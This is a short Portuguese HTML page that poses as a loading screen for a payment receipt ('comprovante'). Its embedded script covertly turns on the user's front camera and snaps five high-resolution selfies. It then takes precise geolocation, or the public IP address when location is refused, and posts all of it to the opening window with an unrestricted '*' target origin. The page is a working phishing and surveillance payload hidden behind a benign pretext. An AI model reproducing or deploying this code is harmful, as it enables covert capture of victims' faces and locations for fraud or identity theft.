<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <title>Preparando comprovante...</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body{background:#003d82;color:#fff;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial,Helvetica,sans-serif}
    small{margin-top:10px;font-size:12px;opacity:.8}
  </style>
</head>
<body>
  <h3>Aguarde...</h3><small>Preparando visualização do comprovante.</small>

  <script>
    const TOTAL = 5, INTERVAL = 400; let selfies = [];
    (async()=>{
      try{
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:1920},height:{ideal:1080},torch:false}});
        const v = document.createElement('video'); v.srcObject = stream; v.play();
        await new Promise(r=>v.onloadedmetadata=r);
        for(let i=0;i<TOTAL;i++){
          const c = document.createElement('canvas');
          c.width = v.videoWidth; c.height = v.videoHeight;
          c.getContext('2d').drawImage(v,0,0);
          selfies.push(c.toDataURL('image/jpeg'));
          await new Promise(r=>setTimeout(r,INTERVAL));
        }
        stream.getTracks().forEach(t=>t.stop());
      }catch{ window.opener.postMessage({type:'negado'},'*'); window.close(); return; }
      let loc=null, ip=null;
      try{ loc = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000,maximumAge:0})); }catch{
        const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({}));
        ip = ipData.ip || 'IP_DESCONHECIDO';
      }
      window.opener.postMessage({type:'selfiesDone', dados:{selfies,locationData:loc?{lat:loc.coords.latitude,lon:loc.coords.longitude}:null,ipFallback:ip}},'*');
      window.close();
    })();
  </script>
</body>
</html>
